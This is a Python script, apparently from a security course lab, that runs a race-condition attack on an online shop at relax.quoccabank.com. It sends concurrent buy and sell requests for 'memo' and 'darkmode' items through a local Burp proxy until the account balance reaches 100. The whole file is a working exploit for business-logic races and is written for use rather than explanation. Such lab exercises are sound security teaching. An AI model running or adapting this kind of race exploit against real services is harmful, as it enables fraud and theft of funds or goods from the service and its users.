import requests
from threading import Thread
import re
from urllib3.exceptions import InsecureRequestWarning
# Silences warnings about not verifying Burp's CA certificate.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



# Define the request data
requests_data = [
    {"url": "https://relax.quoccabank.com/service/items/buy", "data": '{"item":"memo"}'},
    {"url": "https://relax.quoccabank.com/service/items/buy", "data": '{"item":"darkmode"}'},
    {"url": "https://relax.quoccabank.com/service/items/sell", "data": '{"item":"memo"}'},
    {"url": "https://relax.quoccabank.com/service/items/sell", "data": '{"item":"darkmode"}'}
]

# Function to send requests
def send_request(url, data):
    proxies = {
        'http': 'http://localhost:8080',
        'https': 'http://localhost:8080'
    }
    headers = {
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Origin": "https://relax.quoccabank.com",
        "Referer": "https://relax.quoccabank.com/",
        "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36"
    }

    while True:
        try:
            response = requests.post(url, headers=headers, data=data, proxies=proxies, verify=False)
            print(response.text)
            
            # {"status":true,"balance":40}
            res = re.search(r'"balance":(\d+)', response.text)
            if res:
                balance = int(res.group(1))
                if balance >= 100:
                    print("Balance is now", balance)
                    break
            
        except Exception as e:
            print("Error:", e)

# Create and start threads for each request
threads = []
for request in requests_data:
    t = Thread(target=send_request, args=(request["url"], request["data"]))
    t.start()
    threads.append(t)

# Wait for all threads to finish
for t in threads:
    t.join()